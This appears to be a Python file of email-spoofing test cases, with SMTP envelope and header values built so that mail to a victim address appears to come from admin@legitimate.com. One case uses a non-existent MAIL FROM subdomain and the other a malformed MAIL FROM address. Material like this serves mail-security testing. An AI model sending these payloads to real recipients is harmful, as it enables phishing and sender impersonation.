from additional.common import *

# Change Content Type depending if you want to send plain text or html. You can play with this to headers:
# - Content-Type: text/html; charset="iso-8859-1"
# - Content-Type: text/plain; charset="UTF-8"


cases = {
    "1": {
        "helo": b"helo.attack.com",
        "mailfrom": b"<any@mailfrom.notexist.legitimate.com>",
        "rcptto": b"<victim@victim.com>",
        "data": {                   # Cambiar los datos del correo aqui
            "from_header": b"From: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: Reunion llegar a la hora\r\n",
            "body": b"<h1>Esto es una prueba</h1>\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/html; charset="iso-8859-1"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n',
        },
        "description": b"Non-existent subdomains in MAIL FROM"
    },
    "2": {
        "helo": b"attack.com",
        "mailfrom": b"<(any@legitimate.com>",
        "rcptto": b"<victim@victim.com>",
        "data": {                   # Cambiar los datos del correo aqui
            "from_header": b"From: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: empty MAIL FROM address\r\n",
            "body": b"Esto es un test!\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n',
        },
        "description": b"Empty MAIL FROM addresses"
    }
}